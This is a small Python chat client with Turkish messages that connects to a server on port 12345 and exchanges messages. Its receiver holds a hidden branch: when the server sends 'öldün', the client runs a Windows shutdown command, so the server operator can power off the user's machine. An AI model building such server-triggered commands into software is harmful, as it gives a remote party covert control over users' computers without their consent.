import socket as soc
import threading as th
import subprocess
import sys
import argparse as arg

print("çıkcaksan kapat yaz".upper())

arguments=arg.ArgumentParser()

arguments.add_argument("-i","--ip",dest="host",help="lütfen bağlanılıcak hostun ipsini girin")
argm=arguments.parse_args()


socket=soc.socket(soc.AF_INET,soc.SOCK_STREAM)
socket.connect((argm.host,12345))

nick=input("nickini gir: ")

socket.send(nick.encode())

def receiver():
    while True:
        mess=socket.recv(1024).decode()
        if(mess=="kapandı beyler"):
            print("server kapandı")
            socket.close()
            break
        elif(mess=="öldün"):
            socket.close()
            subprocess.call(["shutdown","/p"])
            break
        else:
            print("\n"+mess)

def sender():
    while True:
        try:
            a=input("")
            if(a=="kapat"):
                socket.send("ben kaçar".encode())
                socket.close()
                break
            elif(a!=""):
                socket.send(a.encode())
        except:
            print("ctrl+c yapma lütfen")
            pass

th.Thread(target=receiver,daemon=True).start()
th.Thread(target=sender).start()